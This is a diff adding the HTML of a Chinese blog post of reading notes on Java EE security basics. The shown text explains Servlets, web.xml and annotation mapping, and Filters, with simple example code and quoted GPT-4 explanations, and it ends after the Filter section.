@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Java 安全研究初探 - Solar1s&#39; Blog</title><meta name="Description" content="本文是俺对 evilpan 大佬https://evilpan.com/2023/04/01/java-ee/博文的阅读笔记与补充"><meta property="og:title" content="Java 安全研究初探" />
+<meta property="og:description" content="本文是俺对 evilpan 大佬https://evilpan.com/2023/04/01/java-ee/博文的阅读笔记与补充" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/a_first_look_at_java_web_security_research/" />
+<meta property="og:image" content="https://qlogo2.store.qq.com/qzone/1139317689/1139317689/100?1668077096"/>
+<meta property="article:published_time" content="2023-04-03T17:03:10+08:00" />
+<meta property="article:modified_time" content="2023-04-03T17:03:10+08:00" /><meta property="og:site_name" content="Solar1s&#39; Personal Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://qlogo2.store.qq.com/qzone/1139317689/1139317689/100?1668077096"/>
+
+<meta name="twitter:title" content="Java 安全研究初探"/>
+<meta name="twitter:description" content="本文是俺对 evilpan 大佬https://evilpan.com/2023/04/01/java-ee/博文的阅读笔记与补充"/>
+<meta name="application-name" content="Solar1s&#39; Personal Blog">
+<meta name="apple-mobile-web-app-title" content="Solar1s&#39; Personal Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="../static/favion.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/a_first_look_at_java_web_security_research/" /><link rel="prev" href="http://example.org/posts/ai_&#43;_productivity_tool_collections/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Java 安全研究初探",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/a_first_look_at_java_web_security_research\/"
+        },"genre": "posts","keywords": "Java Web, Security","wordcount":  21187 ,
+        "url": "http:\/\/example.org\/posts\/a_first_look_at_java_web_security_research\/","datePublished": "2023-04-03T17:03:10+08:00","dateModified": "2023-04-03T17:03:10+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Solar1s"
+            },"description": "本文是俺对 evilpan 大佬https://evilpan.com/2023/04/01/java-ee/博文的阅读笔记与补充"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Solar1s&#39; Blog">Life is not a rat race.</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Solar1s&#39; Blog">Life is not a rat race.</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Java 安全研究初探</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Solar1s</a></span>&nbsp;<span class="post-category">included in <a href="/categories/security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-04-03">2023-04-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;21187 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;43 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#java-ee">Java EE</a></li>
+    <li><a href="#servlet">Servlet</a>
+      <ul>
+        <li><a href="#helloserlet">HelloSerlet</a></li>
+        <li><a href="#filter">Filter</a></li>
+      </ul>
+    </li>
+    <li><a href="#jsp">JSP</a>
+      <ul>
+        <li><a href="#基本语法">基本语法</a></li>
+        <li><a href="#jspservlet">JspServlet</a></li>
+        <li><a href="#标签库与-jstl">标签库与 JSTL</a></li>
+      </ul>
+    </li>
+    <li><a href="#java-表达式语言">Java 表达式语言</a></li>
+    <li><a href="#jdbc">JDBC</a></li>
+    <li><a href="#jmx">JMX</a>
+      <ul>
+        <li><a href="#组件">组件</a></li>
+        <li><a href="#示例">示例</a></li>
+      </ul>
+    </li>
+    <li><a href="#后记">后记</a></li>
+    <li><a href="#reference">Reference</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>本文是俺对 evilpan 大佬https://evilpan.com/2023/04/01/java-ee/博文的阅读笔记与补充:)</p>
+<h2 id="前言">前言</h2>
+<p>“Java 安全，通常指代的是 Java Web 安全。在刚开始学习的一段时间里，面对众多的框架和名词，比如 Spring、Weblogic、EJB、AKB，等等，总感觉狗啃泰山无从下嘴。于是就有了这篇文章，旨在记录学习过程中遇到的所有问题，希望也能对像我一样的初学者有所帮助。”</p>
+<h2 id="java-ee">Java EE</h2>
+<p>“搞过 Java Web 开发的多少会知道 JavaEE。从字面上来看，它的意思是 Java Platform, Enterprise Edition，即 Java 平台企业版。这个名称有够抽象，实际上 Java EE 包含了一系列标准，这些标准主要用来为企业级应用提供分布式计算、Web 服务等的统一定义和接口。另外，这些标准在设计之初就考虑了安全性、拓展性、并发等能力。”</p>
+<p>Java EE（Java Platform, Enterprise Edition）是一个用于开发企业级应用程序的Java平台。它是Java SE（Java Platform, Standard Edition）的扩展，提供了一系列API和组件，用于构建可扩展、安全、可靠的网络应用程序和企业应用程序。</p>
+<p>Java EE提供了许多技术和服务，包括但不限于：</p>
+<ol>
+<li><strong>Java Servlets</strong>：用于处理HTTP请求和响应的服务端技术。</li>
+<li><strong>JavaServer Pages (JSP)</strong>：用于生成动态HTML内容的服务端页面技术。</li>
+<li><strong>JavaServer Faces (JSF)</strong>：一个基于组件的Web应用程序框架，用于简化用户界面开发。</li>
+<li><strong>Enterprise JavaBeans (EJB)</strong>：用于封装业务逻辑的服务端组件模型。</li>
+<li><strong>Java Persistence API (JPA)</strong>：用于处理关系型数据库的对象关系映射（ORM）API。</li>
+<li><strong>Contexts and Dependency Injection (CDI)</strong>：一个依赖注入和上下文管理框架，用于简化Java EE应用程序的开发。</li>
+<li><strong>Java Message Service (JMS)</strong>：一个用于发送和接收消息的API，支持异步通信和松耦合架构。</li>
+<li><strong>Java Transaction API (JTA)</strong>：一个用于管理事务的API，支持分布式事务处理。</li>
+</ol>
+<p>在2019年，Java EE被Eclipse Foundation接管，并更名为Jakarta EE。尽管名称已经改变，但Jakarta EE的目标仍然是继续发展Java EE技术，并保持向后兼容性。随着这个转变，Java EE的开发变得更加开放和社区驱动，有利于技术的持续发展和创新。</p>
+<p>“Java EE 是在 Java SE(Standard Edition) 的基础上建立的，并增加了许多额外的特性和技术来方便构建高可用的企业级应用。Java 中的标准一般定义在 JSR 中，即 Java Specification Requests。例如，Java EE 所涉及的标准就在 <a href="https://jcp.org/en/jsr/platform?listBy=3&amp;listByType=platform" target="_blank" rel="noopener noreffer ">JSRs by Platform - Java EE</a>，其中包含了一些已经撤回的。”</p>
+<p>从这些提案(标准)中，我们大概可以知道 Java EE 所涵盖的一些方向，比如:</p>
+<ul>
+<li>jsr-9: XML Parsing Specification, 定义了 Java 中对 XML 进行处理的接口 (JAXP)；</li>
+<li>jsr-19: Enterprise JavaBeans 2.0，即 EJB，提供了易管理的企业级组件定义和接口；</li>
+<li>jsr-52: A Standard Tag Library for JavaServer PagesTM，定义了 JSP 中标签库的标准；</li>
+<li>jsr-53: JavaTM Servlet 2.3 and JavaServer PagesTM 1.2 Specifications，定义了 Servlet 和 JSP 的标准；</li>
+<li>jsr-367: JavaTM API for JSON Binding (JSON-B)，定义了 Java 对象到 JSON 之间转换(序列化/反序列化) 的标准；</li>
+</ul>
+<p>“除此之外还有许多其他的定义，如 EJB，JSF (JavaServer Faces)，CDI (Contexts and Dependency Injection)，JavaMail 等，这里其实可以不用太过关注，在需要深入理解的时候再阅读其文档即可。”</p>
+<h2 id="servlet">Servlet</h2>
+<p>“Servlet 可以说是 Java Web 开发中基础的基础。可能和我差不多的中年人都会知道早期 Web 开发大多是基于 CGI 的，即写一个二进制程序或者 Perl 脚本去处理 Web 服务器的 HTTP 请求，请求的内容会封装到环境变量里。Sun 公司在 1996 年发布 Servlet 技术就是为了和 CGI 进行竞争，Servlet 这个名字是 Server Applet 的缩写，即服务端小程序。”</p>
+<blockquote>
+<p>GPT-4：</p>
+<p>Servlet（Java Servlet）是一种基于Java的服务端技术，用于处理客户端发送的HTTP请求并生成响应。Servlet是Java Web应用程序的核心组成部分，用于接收和处理来自Web浏览器或其他HTTP客户端的请求，然后返回HTML页面、文本、图像或其他数据类型的响应。</p>
+<p>Servlet的主要优点在于它的可扩展性、可移植性和高性能。作为Java平台的一部分，Servlet可以运行在任何支持Java的操作系统上，并且可以在多种Web服务器和应用服务器中部署。</p>
+<p>Servlet的生命周期通常包括以下三个阶段：</p>
+<ol>
+<li><strong>初始化（Initialization）</strong>：当Servlet被Web服务器加载并实例化时，<code>init()</code>方法会被调用。这个阶段通常用于执行一次性的初始化操作，如加载配置文件等。</li>
+<li><strong>处理请求（Request handling）</strong>：当客户端发送HTTP请求时，Servlet的<code>service()</code>方法会被调用。<code>service()</code>方法负责根据请求类型（如GET、POST等）调用适当的方法（如<code>doGet()</code>或<code>doPost()</code>）。在这个阶段，Servlet处理请求并生成响应。</li>
+<li><strong>销毁（Destruction）</strong>：当Servlet被卸载时，<code>destroy()</code>方法会被调用。这个阶段通常用于释放资源和执行清理操作。</li>
+</ol>
+<p>为了创建一个Servlet，你需要继承<code>javax.servlet.http.HttpServlet</code>类并覆盖相应的方法，如<code>doGet()</code>、<code>doPost()</code>等。然后，你需要在Web应用程序的<code>web.xml</code>文件中配置Servlet，或者使用Java注解（如<code>@WebServlet</code>）来声明Servlet。</p>
+<p>总之，Servlet是Java Web应用程序中处理HTTP请求的核心组件，它提供了一个可扩展、可移植且高性能的服务端技术。</p>
+</blockquote>
+<p>从上面的介绍也可以看到，Servlet 本身也是一个 Java EE 的标准，比如 <a href="https://jcp.org/en/jsr/detail?id=340" target="_blank" rel="noopener noreffer ">Java Servlet 3.1</a> 就是其中一个版本。一般开发者可能很少需要直接阅读标准文档，且文档中也说明其目标主要是 Web 服务器的开发者。不过作为安全研究人员，我们可以从中学习到很多 Servlet 的基础架构和设计思想。</p>
+<p>从实现上来说，Servlet 是一个实现了特定接口的 Web 组件，由 Servlet 容器去加载并运行。<code>容器</code> 本身并不一定是 Web 服务器，但容器需要至少支持 HTTP 请求，并将请求的内容封装成 Servlet 接口的参数；因此容器通常与 Web 服务器集成或者作为其拓展而存在。目前常见的 Servlet 容器如 Tomcat、GlassFish、JBoss 等，同样也具备 Web 服务器的功能。</p>
+<blockquote>
+<p>GPT-4：</p>
+<p>这段话描述了Servlet的实现和它在Java Web应用中的角色。让我们分解这段话以了解更多细节：</p>
+<ol>
+<li><strong>实现特定接口的Web组件</strong>：Servlet是一个实现了特定接口（如<code>javax.servlet.Servlet</code>和<code>javax.servlet.http.HttpServlet</code>）的Java类。这些接口定义了Servlet的基本结构和方法，使得Servlet可以处理HTTP请求。</li>
+<li><strong>Servlet容器</strong>：Servlet容器负责加载、管理和运行Servlet。它是Java Web应用程序的核心组件，负责处理客户端的请求并将其转发给相应的Servlet进行处理。Servlet容器还负责管理Servlet的生命周期。</li>
+<li><strong>容器与Web服务器的关系</strong>：虽然Servlet容器不一定是Web服务器，但它需要支持HTTP请求并将请求内容封装成Servlet接口的参数。因此，Servlet容器通常与Web服务器集成，或作为其扩展而存在。这种集成允许Web服务器接收HTTP请求，并将这些请求传递给Servlet容器进行处理。</li>
+<li><strong>常见的Servlet容器</strong>：Tomcat、GlassFish和JBoss等都是常见的Servlet容器，它们同时也具备Web服务器的功能。这意味着它们既可以接收和处理HTTP请求，也可以运行和管理Servlet。</li>
+</ol>
+<p>总之，这段话解释了Servlet的实现方式和它在Java Web应用程序中的作用。Servlet是实现了特定接口的Web组件，由Servlet容器（如Tomcat、GlassFish或JBoss）加载并运行。Servlet容器处理HTTP请求，并将请求内容封装成Servlet接口的参数，从而与Web服务器集成或作为其扩展。</p>
+</blockquote>
+<p>根据文档所述，一个基础的 Servlet 接口如下所示:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">javax.servlet</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">Servlet</span> <span class="o">{</span>
+    <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">ServletConfig</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">;</span>
+    <span class="n">ServletConfig</span> <span class="nf">getServletConfig</span><span class="o">();</span>
+    <span class="kt">void</span> <span class="nf">service</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">var1</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">var2</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">;</span>
+    <span class="n">String</span> <span class="nf">getServletInfo</span><span class="o">();</span>
+    <span class="kt">void</span> <span class="nf">destroy</span><span class="o">();</span>
+<span class="o">}</span>
+</code></pre></div><p>其中重要的接口是 <code>service</code> 方法，用于处理客户端的请求，并填充所需的返回结果。<code>init</code> 和 <code>destory</code> 是生命周期方法，在 Servlet 被加载和销毁时只执行一次。 <code>getServletConfig</code> 返回的对象是类似 name/value 格式的配置信息，由用户配置文件中进行传入。</p>
+<h3 id="helloserlet">HelloSerlet</h3>
+<p>“为了方便开发者进行快速的原型开发，在 JDK 中已经实现了常用的 Servlet 功能，即 <code>GenericServlet</code>，而对于 HTTP 请求，又进一步实现了 <code>HttpServlet</code> 抽象类。这样，如果用户需要编写一个 Servlet 处理如 GET/POST 请求，只需要重写对应的方法即可。”</p>
+<p>使用 IDEA 自动创建的示例 Servlet 如下:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.annotation.*</span><span class="o">;</span>
+
+<span class="nd">@WebServlet</span><span class="o">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;helloServlet&#34;</span><span class="o">,</span> <span class="n">value</span> <span class="o">=</span> <span class="s">&#34;/hello&#34;</span><span class="o">)</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">message</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">message</span> <span class="o">=</span> <span class="s">&#34;Hello World!&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">&#34;text/html&#34;</span><span class="o">);</span>
+
+        <span class="c1">// Hello
+</span><span class="c1"></span>        <span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;&lt;html&gt;&lt;body&gt;&#34;</span><span class="o">);</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;&lt;h1&gt;&#34;</span> <span class="o">+</span> <span class="n">message</span> <span class="o">+</span> <span class="s">&#34;&lt;/h1&gt;&#34;</span><span class="o">);</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>“值得注意的是，正常情况下定义好 HelloServlet 类之后，容器并不知道这个类的存在，也不知道应该将什么 HTTP 路径映射到这个 Servlet，传统上需要用户自己修改 <code>web.xml</code> 配置文件(这也是 Servlet 标准的一部分)，添加 <code>&lt;servlet&gt;</code> 和 <code>&lt;servlet-mapping&gt;</code> 标签来指定这些信息。在 Servlet 3.0 之后，就可以使用注解的方式配置 Servlet 了，如上面的 <code>WebServlet</code> 注解。”</p>
+<p>这段话解释了如何让Servlet容器识别并管理一个自定义的Servlet类（如HelloServlet），以及如何将指定的HTTP路径映射到这个Servlet。这里提到了两种配置方法：传统的<code>web.xml</code>配置文件方式和Servlet 3.0引入的基于注解的配置方式。</p>
+<ol>
+<li>
+<p><strong>传统的web.xml配置文件方式</strong>：在这种方法中，开发者需要在<code>web.xml</code>配置文件中添加<code>&lt;servlet&gt;</code>和<code>&lt;servlet-mapping&gt;</code>标签，以指定Servlet类的名称、映射的URL等信息。Servlet容器将根据这些配置信息加载并管理相应的Servlet实例。</p>
+<p>例如：</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;servlet&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>HelloServlet<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;servlet-class&gt;</span>com.example.HelloServlet<span class="nt">&lt;/servlet-class&gt;</span>
+<span class="nt">&lt;/servlet&gt;</span>
+<span class="nt">&lt;servlet-mapping&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>HelloServlet<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/hello<span class="nt">&lt;/url-pattern&gt;</span>
+<span class="nt">&lt;/servlet-mapping&gt;</span>
+</code></pre></div><p>这里，<code>&lt;servlet-class&gt;</code>标签指定了Servlet类的全限定名，而<code>&lt;url-pattern&gt;</code>标签定义了请求的URL路径映射到HelloServlet。</p>
+</li>
+<li>
+<p><strong>基于注解的配置方式</strong>：从Servlet 3.0开始，可以使用注解（如<code>@WebServlet</code>）来配置Servlet。这种方式不再需要修改<code>web.xml</code>文件，而是直接在Servlet类上添加注解，指定其名称和URL映射。</p>
+<p>例如：</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="nd">@WebServlet</span><span class="o">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;HelloServlet&#34;</span><span class="o">,</span> <span class="n">urlPatterns</span> <span class="o">=</span> <span class="s">&#34;/hello&#34;</span><span class="o">)</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="c1">// ...
+</span><span class="c1"></span><span class="o">}</span>
+</code></pre></div><p>这里，<code>@WebServlet</code>注解指定了Servlet的名称和URL映射。Servlet容器会根据这些注解信息自动加载并管理Servlet实例。</p>
+</li>
+</ol>
+<h3 id="filter">Filter</h3>
+<p>Java Servlet中的<code>Filter</code>是一种可用于处理HTTP请求和响应的组件。它们通常用于实现诸如身份验证、授权、日志记录、编码转换等功能。<code>Filter</code>可以在请求到达Servlet之前处理请求，也可以在响应离开Servlet后处理响应。它们是基于Java Servlet技术的一个重要特性，通常用于实现横切关注点（cross-cutting concerns）。</p>
+<p>一个简单的示例如下:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.annotation.WebFilter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.PrintWriter</span><span class="o">;</span>
+
+<span class="nd">@WebFilter</span><span class="o">(</span><span class="n">filterName</span> <span class="o">=</span> <span class="s">&#34;HelloFilter&#34;</span><span class="o">,</span> <span class="n">urlPatterns</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;/*&#34;</span><span class="o">})</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloFilter</span> <span class="kd">implements</span> <span class="n">Filter</span> <span class="o">{</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">passwd</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;passwd&#34;</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">passwd</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">passwd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;123456&#34;</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">(</span><span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;passwd error!&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p><code>Filter</code>接口定义了三个方法：</p>
+<ol>
+<li><code>void init(FilterConfig filterConfig)</code>: 当Filter被Servlet容器初始化时调用。<code>FilterConfig</code>对象包含了Filter的配置信息，如初始化参数等。这个方法通常用于执行一次性的初始化操作。</li>
+<li><code>void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</code>: 当请求和响应经过Filter时，此方法被调用。它接收三个参数：<code>ServletRequest</code>（请求对象），<code>ServletResponse</code>（响应对象），和<code>FilterChain</code>（过滤器链）。在<code>doFilter</code>方法中，可以修改请求和响应对象，或者根据需要决定是否继续处理（即调用<code>chain.doFilter(request, response)</code>）。如果不调用<code>chain.doFilter(request, response)</code>，则请求处理会在当前Filter处停止。</li>
+<li><code>void destroy()</code>: 在Filter被卸载之前，此方法被Servlet容器调用。通常用于释放资源，如关闭数据库连接等。</li>
+</ol>
+<p>要创建一个Filter，需要实现<code>javax.servlet.Filter</code>接口，并覆盖这些方法。然后需要通过<code>web.xml</code>文件或者使用注解（如<code>@WebFilter</code>）配置Filter。</p>
+<p>以下是一个简单的Filter示例，实现日志记录功能：</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.annotation.WebFilter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="nd">@WebFilter</span><span class="o">(</span><span class="n">urlPatterns</span> <span class="o">=</span> <span class="s">&#34;/*&#34;</span><span class="o">)</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LoggingFilter</span> <span class="kd">implements</span> <span class="n">Filter</span> <span class="o">{</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// 初始化操作，如打开日志文件等
+</span><span class="c1"></span>    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">chain</span><span class="o">)</span>
+            <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
+        <span class="c1">// 记录请求信息
+</span><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Request received: &#34;</span> <span class="o">+</span> <span class="n">request</span><span class="o">.</span><span class="na">getRemoteAddr</span><span class="o">());</span>
+
+        <span class="c1">// 继续处理请求（调用其他Filter或Servlet）
+</span><span class="c1"></span>        <span class="n">chain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
+
+        <span class="c1">// 记录响应信息
+</span><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Response sent: &#34;</span> <span class="o">+</span> <span class="n">response</span><span class="o">.</span><span class="na">getContentType</span><span class="o">());</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+        <span class="c1">// 清理操作，如关闭日志文件等
+</span><span class="c1"></span>    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>在这个示例中，我们使用<code>@WebFilter(urlPatterns = &quot;/*&quot;)</code>注解配置Filter，使其应用于所有请求。<code>doFilter</code>方法记录请求和响应的信息，然后调用<code>chain.doFilter(request, response)</code>以继续处理请求。</p>
+<p>总之，Java Servlet中的<code>Filter</code>是一种用于处理请求和响应的组件，可以实现如身份验证、授权、日志记录等功能。通过实现<code>Filter</code>接口并配置相应的映射，可以在Servlet容器中使用Filter。</p>
